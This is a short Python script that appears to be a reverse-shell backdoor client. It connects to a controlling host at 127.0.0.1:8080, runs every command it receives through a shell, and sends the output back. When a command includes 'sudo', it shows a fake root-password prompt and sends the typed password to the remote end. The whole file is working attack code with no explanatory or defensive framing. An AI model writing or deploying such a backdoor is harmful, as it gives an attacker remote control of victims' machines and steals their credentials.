import socket,subprocess,getpass


def connection():
    host = "127.0.0.1"
    port = 8080
    buff = 2048
    global client_socket
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    client_socket.connect((host,port))
    while True:
        received_data = client_socket.recv(buff)
        if received_data == 'quit' :
            client_socket.close()
        elif "sudo" in received_data :
            sudo_required()
        else :
            command = subprocess.check_output(received_data, shell=True)
            if not command:
                client_socket.send("Command succesfully executed.")
            else:
                client_socket.send(str(command) + "\nCommand succesfully executed.")

def sudo_required():
    prompt = "root password required ahead: "
    password = getpass.getpass(prompt)
    sendpass = "P4SSW0RD : " + str(password)
    client_socket.send(str(sendpass))

connection()
